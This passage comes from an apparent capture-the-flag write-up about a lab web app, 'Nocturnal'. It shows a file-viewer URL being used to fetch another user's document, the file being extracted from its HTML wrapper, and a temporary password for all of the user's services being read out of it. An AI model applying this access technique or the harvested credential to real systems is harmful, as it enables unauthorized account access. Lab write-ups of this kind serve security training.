    <div class='error'>File does not exist.</div><h2>Available files for download:</h2><ul><li><a href="view.php?username=amanda&file=privacy.odt">privacy.odt</a></li></ul>
</div>

</body>
</html>
```

When I get the right file, the headers send `application/octet-stream`, even though it’s still an HTML page:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Apr 2025 20:39:17 GMT
Content-Type: application/octet-stream
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="privacy.odt"
Content-Length: 23396

<!DOCTYPE html>
<html lang="en">
<head>
...[snip]...
<div class="container">
    <h1>File Viewer</h1>

    PK
...[snip]...
```

The `.odt` file is embedded in the page. So the resulting file is HTML with the file in it. I have no idea why the site is designed this way - pretty poor design. Opening this file in Libre Office shows the HTML with the embedded file:

![image-20250415164217705](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250415164217705.png)

### Recover File

There’s a few ways to recover the raw file. I just open `vim` and delete all the bytes up until the `PK` magic bytes and save.

If I open it in Word, it’ll offer to recover the file:

![image-20250415164450447](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250415164450447.png)

Saying yes will remove all the HTML and open it correctly.

Office files are just zip archives, and `zip` will also ignore the HTML and unzip the legit zip:

```console
oxdf@hacky$ unzip privacy.odt
Archive:  privacy.odt
warning [privacy.odt]:  2919 extra bytes at beginning or within zipfile
  (attempting to process anyway)
 extracting: mimetype
   creating: Configurations2/accelerator/
   creating: Configurations2/images/Bitmaps/
   creating: Configurations2/toolpanel/
   creating: Configurations2/floater/
   creating: Configurations2/statusbar/
   creating: Configurations2/toolbar/
   creating: Configurations2/progressbar/
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/
  inflating: styles.xml
  inflating: manifest.rdf
  inflating: content.xml
  inflating: meta.xml
  inflating: settings.xml
 extracting: Thumbnails/thumbnail.png
  inflating: META-INF/manifest.xml
```

I can then re-zip it, or just get the text from `content.xml`:

```console
oxdf@hacky$ xmllint --format content.xml
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:officeooo="http://openoffice.org/2009/office" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" office:version="1.3">
  <office:scripts/>
  <office:font-face-decls>
    <style:font-face style:name="FreeSans" svg:font-family="FreeSans" style:font-family-generic="swiss"/>
    <style:font-face style:name="FreeSans1" svg:font-family="FreeSans" style:font-family-generic="system" style:font-pitch="variable"/>
    <style:font-face style:name="Liberation Sans" svg:font-family="'Liberation Sans'" style:font-family-generic="swiss" style:font-pitch="variable"/>
    <style:font-face style:name="Liberation Serif" svg:font-family="'Liberation Serif'" style:font-family-generic="roman" style:font-pitch="variable"/>
    <style:font-face style:name="Noto Sans" svg:font-family="'Noto Sans'" style:font-family-generic="system" style:font-pitch="variable"/>
  </office:font-face-decls>
  <office:automatic-styles>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0014ab09" officeooo:paragraph-rsid="0014ab09"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00155607"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text>
      <text:sequence-decls>
        <text:sequence-decl text:display-outline-level="0" text:name="Illustration"/>
        <text:sequence-decl text:display-outline-level="0" text:name="Table"/>
        <text:sequence-decl text:display-outline-level="0" text:name="Text"/>
        <text:sequence-decl text:display-outline-level="0" text:name="Drawing"/>
        <text:sequence-decl text:display-outline-level="0" text:name="Figure"/>
      </text:sequence-decls>
      <text:p text:style-name="P1">Dear <text:span text:style-name="T1">Amanda</text:span>,</text:p>
      <text:p text:style-name="P1">Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.</text:p>
      <text:p text:style-name="P1">The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.</text:p>
      <text:p text:style-name="P1">Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Yours sincerely,</text:p>
      <text:p text:style-name="P1">Nocturnal's IT team</text:p>
    </office:text>
  </office:body>
</office:document-content>
```
